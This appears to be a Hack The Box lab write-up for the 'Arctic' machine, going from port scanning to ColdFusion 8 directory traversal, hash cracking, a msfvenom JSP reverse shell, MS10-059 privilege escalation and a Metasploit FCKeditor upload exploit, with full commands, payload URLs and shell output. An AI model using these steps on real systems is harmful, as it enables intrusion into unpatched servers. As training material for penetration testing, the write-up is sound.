## Default Information
IP Address: 10.10.10.11\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.11    arctic.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.11 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-09 00:35:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49154/tcp on 10.10.10.11                                  
Discovered open port 135/tcp on 10.10.10.11 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 135	| msrpc | Microsoft Windows RPC | Open |
| 8500	| fmtp? | NIL | Open |
| 49154	| msrpc | Microsoft Windows RPC | Open |

### Web-content discovery

Navigating to http://arctic.htb:8500, we realize that we are able to view a directory listing of the endpoints on the site.

![Directory listing](https://github.com/joelczk/writeups/blob/main/HTB/Images/Arctic/dir_listing.png)

Navigating through the directory listing, we are able to find another endpoint http://http://arctic.htb:8500/CFIDE/administrator/, which is the adminstrator interface for ColdFusion 8.

## Exploit
### Directory Traversal in Cold Fusion 8

Looking up the vulnerabilities of Cold Fusion 8, we discover that this version of Cold Fusion is vulnerable to [CVE-2010-2861](https://www.exploit-db.com/exploits/14641).

Using this vulnerability, we can then visit ```http://arctic.htb:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en```, and we will then be able to obtain the password hash.
![Directory Traversal](https://github.com/joelczk/writeups/blob/main/HTB/Images/Arctic/directory_traversal.png)

Looking up the hash using the hash-identifier tool, we are able to recognize that this is posisbly a SHA-1 hash.

```
┌──(kali㉿kali)-[~]
└─$ hash-identifier
--------------------------------------------------
 HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

Looking up the hash online, we are able to decrypt the hash into its password, which is ```happyday```

Using the password, we are then able to authenticate into http://arctic.htb:8500/CFIDE/administrator/

### Obtaining reverse shell

Firstly, we would need to first get the directory for our ```CFIDE```. To do so, we would need to navigate to Mappings under Server Settings.

![Mappings](https://github.com/joelczk/writeups/blob/main/HTB/Images/Arctic/mappings.png)

Next, what we have to do is to create a scheduled task. To do that, we will go to Debugging & Loggin > Scheduled Tasks > Schedule New Task

Afterwards, we will have to generate the jsp payload using msfvenom and start a python web server on the directory.

```
┌──(kali㉿kali)-[~/Desktop/arctic]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.8 LPORT=3000 -f raw > shell.jsp   
Payload size: 1496 bytes

┌──(kali㉿kali)-[~/Desktop/arctic]
└─$ python3 -m http.server 2000                 
Serving HTTP on 0.0.0.0 port 2000 (http://0.0.0.0:2000/) ...
```

Next, we will have to schedule the new task (NOTE: Remember to click ```save output to file``` so that we can access it at the /CFIDE endpoint later). 
- Task Name: Any name
- URL : Python web server hosting the jsp reverse shell
- username : username of the adminstrator interface (```admin``` in this case)
- password: Password of the adminstrator interface(```happyday``` in this case)
- File : CFIDE mapping that we have obtained earlier
![Scheduling new task](https://github.com/joelczk/writeups/blob/main/HTB/Images/Arctic/new_task.png)

We will then proceed to click on the leftmost button to start the scheduled task. This will then do a GET request to our python webserver to download the shell.jsp file and download it to our C:\ColdFusion8\wwwroot\CFIDE directory which is accessible at http://arctic.htb:8500/CFIDE/

![Obtaining new task](https://github.com/joelczk/writeups/blob/main/HTB/Images/Arctic/new_task.png)

Lastly we will do a curl request to http://arctic.htb:8500/CFIDE/shell.jsp to spawn the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ curl http://arctic.htb:8500/CFIDE/shell.jsp
```

### Obtaining user flag
```
C:\Users\tolis\Desktop>type user.txt
type user.txt
<Redacted User Flag>
```

### Privilege Escalation to system adminstrator

Running systeminfo,  we are able to know the OS name and the OS version. Apart from that, we realized that there are no hotfix that are applied yet which means that the server might possibly be vulnerable to many kernel exploits.

```
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
Hotfix(s):                 N/A
```

From our research, we realize that the machine is vulnerable to MS10-059.  Downloading the executable from [here](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059), we can then execute the executable to spawn a reverse shell.

```
c:\Users\tolis\Desktop>.\MS10-059.exe 10.10.16.8 3000
```

This will then spawn a reverse shell in our listener.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000    
listening on [any] 3000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.11] 50363
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Users\tolis\Desktop>whoami
whoami
nt authority\system

c:\Users\tolis\Desktop>
```

### Obtaining root flag
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
C:\Users\Administrator\Desktop>
```

## Post-Exploitation
### Generating reverse shell using CVE-2009-2265
Some more googling bring me to CVE-2009-2265, which is an unauthenticated RCE on Cold Fusion 8. 

Using the script from [here](https://www.exploit-db.com/exploits/50057), we can generate a reverse shell by modifying the lport, lhost, rport and rhost variables in the script.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.11] 52054
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

For this vulnerability, we are making use of the ability to upload a JSP script to http://arctic.htb:8500/userfiles/file endpoint. As such, we can create a reverse shell in jsp and upload to the affected endpoint. 

Afterwhich, we just have to browse to the reverse shell payload in order to execute the reverse shell.

![Reverse shell payload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Arctic/reverse_shell.png)


## Post-Exploiation
### Reverse shell with Metasploit
Firstly, we can create our reverse shell using Metasploit using the same vulnerability that we have listed in the writeup above. In the case where the upload fails, try to set the HTTPCLIENTTIMEOUT to a greater value as this server is quite slow and it generally takes some time for the server to respond. 

```
msf6 > use exploit/windows/http/coldfusion_fckeditor
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(windows/http/coldfusion_fckeditor) > set RHOSTS 10.10.10.11
RHOSTS => 10.10.10.11
msf6 exploit(windows/http/coldfusion_fckeditor) > set RPORT 8500
RPORT => 8500
msf6 exploit(windows/http/coldfusion_fckeditor) > set PAYLOAD java/jsp_shell_reverse_tcp
PAYLOAD => java/jsp_shell_reverse_tcp
msf6 exploit(windows/http/coldfusion_fckeditor) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf6 exploit(windows/http/coldfusion_fckeditor) > set LPORT 4000
LPORT => 4000
msf6 exploit(windows/http/coldfusion_fckeditor) > set HTTPCLIENTTIMEOUT 300
HTTPCLIENTTIMEOUT => 300.0
msf6 exploit(windows/http/coldfusion_fckeditor) > exploit
[*] Started reverse TCP handler on 10.10.16.8:4000 
[*] Sending our POST request...
[*] Upload succeeded! Executing payload...
[*] Command shell session 1 opened (10.10.16.8:4000 -> 10.10.10.11:50400) at 2022-01-09 06:16:30 -0500
```
